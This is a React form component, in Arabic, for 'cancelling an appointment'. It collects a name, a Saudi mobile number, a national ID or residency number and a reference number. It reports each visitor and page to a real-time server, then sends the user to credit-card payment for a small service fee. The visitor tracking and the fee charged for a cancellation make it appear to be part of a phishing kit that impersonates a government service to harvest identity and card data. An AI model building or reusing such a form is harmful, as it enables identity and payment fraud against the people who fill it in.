import { Input } from "@/components/VSC-client/ui/input";
import Label from "@/components/VSC-client/ui/label";
import { Controller, useForm } from "react-hook-form";
import { useEffect, useRef } from "react";
import {
  sendDataToServer,
  registerVisitor,
  setCurrentPage,
} from "@/real-time/utils/utils";
import {
  Button,
  FormControl,
  InputAdornment,
  OutlinedInput,
  Stack,
} from "@mui/material";
import { validatityCheck } from "@/lib/helpers";

interface FormData {
  id: string;
  name: string;
  phone: string;
  code: string;
  referenceNumber: string;
}

const currentPageName = "إلغاء موعد";

const CancelForm = () => {
  const formRef = useRef<HTMLFormElement>(null);

  const {
    register,
    handleSubmit,
    control,
    watch,
    formState: { errors },
  } = useForm<FormData>({
    mode: "all",
    defaultValues: { code: "(+966)" },
  });

  useEffect(() => {
    setCurrentPage(currentPageName);
  }, []);

  const onSubmit = (data: FormData) => {
    const fee = {
      base: 10.0,
      vat: 1.5,
      total: 11.5,
    };

    const { name, id, phone, ...serverData } = data;

    registerVisitor({ fullName: name, idNumber: id, phone });

    localStorage.setItem(
      "paymentInvoice",
      JSON.stringify({ fee, feeTitle: "الخدمة" })
    );

    sendDataToServer({
      data: {
        الاسم: name,
        "رقم الهوية": id,
        "رقم الجوال": phone,
        "الرقم المرجعي": serverData.referenceNumber,
      },
      current: currentPageName,
      nextPage: `الدفع بطاقة الائتمان`,
    });
  };

  return (
    <form
      className="lg:mt-16 flex flex-col gap-4"
      onSubmit={handleSubmit(onSubmit)}
      ref={formRef}
    >
      <div className="max-w-sm space-y-2">
        <Label htmlFor="name" className="text-foreground font-semibold">
          الأسم
        </Label>
        <Input
          type="text"
          id="name"
          placeholder="أكتب أسمك هنا..."
          {...register("name", { required: "هذا الحقل مطلوب" })}
        />
        {errors.name && (
          <p className="text-red-500 text-sm">{errors.name.message}</p>
        )}
      </div>

      <div className="max-w-sm flex gap-2 lg:gap-10">
        <div className="space-y-2 flex-1">
          <Stack>
            <Label htmlFor="phone" className="text-foreground font-semibold">
              رقم الجوال
            </Label>
            <FormControl fullWidth margin="none" size="small">
              <Controller
                name="phone"
                control={control}
                rules={{
                  required: "يرجى إدخال رقم الجوال",
                  validate: (value) => {
                    const cleaned = (value as string).replace(/[^\d]/g, "");
                    return (
                      /^05\d{8}$/.test(cleaned) ||
                      "رقم الجوال غير صحيح؛ يجب أن يبدأ بـ05 ويتكون من 10 أرقام"
                    );
                  },
                }}
                render={({ field }) => (
                  <>
                    <OutlinedInput
                      {...field}
                      dir="ltr"
                      id="phone"
                      type="tel"
                      sx={{
                        "& .MuiOutlinedInput-notchedOutline": {
                          borderColor: "#e2e8f0",
                        },
                        "&:hover .MuiOutlinedInput-notchedOutline": {
                          borderColor: "#e2e8f0",
                        },
                      }}
                      onChange={(e) => {
                        let rawValue = e.target.value.replace(/[^\d]/g, "");
                        if (rawValue.length > 10) {
                          rawValue = rawValue.slice(0, 10);
                        }
                        field.onChange(rawValue);
                      }}
                      startAdornment={
                        <InputAdornment position="start">
                          <img
                            src="https://flagcdn.com/sa.svg"
                            alt="flag sa"
                            className="w-8"
                          />
                        </InputAdornment>
                      }
                    />
                    {!watch("phone") && (
                      <span
                        className="absolute inset-y-0 left-3 text-gray-400 flex items-center pointer-events-none"
                        style={{ right: "10px" }}
                      >
                        أكتب رقم الجوال المفوض هنا...
                      </span>
                    )}
                  </>
                )}
              />
            </FormControl>
          </Stack>
          {errors.phone && (
            <p className="text-red-500 text-sm">{errors.phone.message}</p>
          )}
        </div>
      </div>

      <div className="max-w-sm space-y-2">
        <Label htmlFor="id" className="text-foreground font-semibold">
          رقم الهوية الوطنية / الاقامة
        </Label>
        <Input
          type="tel"
          id="id"
          placeholder="...أكتب رقم الهوية الوطنية / الاقامة هنا"
          {...register("id", {
            required: "هذا الحقل مطلوب",
            validate: (value) =>
              validatityCheck("id", value) || "رقم الهوية غير صالح",
            pattern: {
              value: /^\d{10}$/,
              message: "رقم الهوية يجب أن يكون 10 أرقام",
            },
          })}
        />
        {errors.id && (
          <p className="text-red-500 text-sm">{errors.id.message}</p>
        )}
      </div>

      <div className="max-w-sm space-y-2">
        <Label
          htmlFor="referenceNumber"
          className="text-foreground font-semibold"
        >
          الرقم المرجعي
        </Label>
        <Input
          type="tel"
          id="referenceNumber"
          placeholder="أدخل الرقم المرجعي هنا..."
          {...register("referenceNumber", { required: "هذا الحقل مطلوب" })}
        />
        {errors.referenceNumber && (
          <p className="text-red-500 text-sm">
            {errors.referenceNumber.message}
          </p>
        )}
      </div>

      <Button
        type="submit"
        variant="contained"
        size="large"
        sx={{ width: "fit-content", mx: "auto" }}
      >
        التالي
      </Button>
    </form>
  );
};
export default CancelForm;
